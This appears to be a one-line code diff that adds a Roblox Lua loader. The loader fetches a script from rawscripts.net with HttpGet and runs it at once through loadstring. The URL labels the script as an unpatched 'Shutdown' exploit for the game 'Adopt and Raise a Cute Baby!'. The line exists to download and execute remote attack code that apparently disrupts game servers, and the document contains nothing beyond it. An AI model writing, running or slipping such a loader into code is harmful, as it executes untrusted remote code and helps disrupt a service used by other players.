@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://rawscripts.net/raw/Adopt-and-Raise-a-Cute-Baby!-Shutdown-UNPTCHED-10111"))()
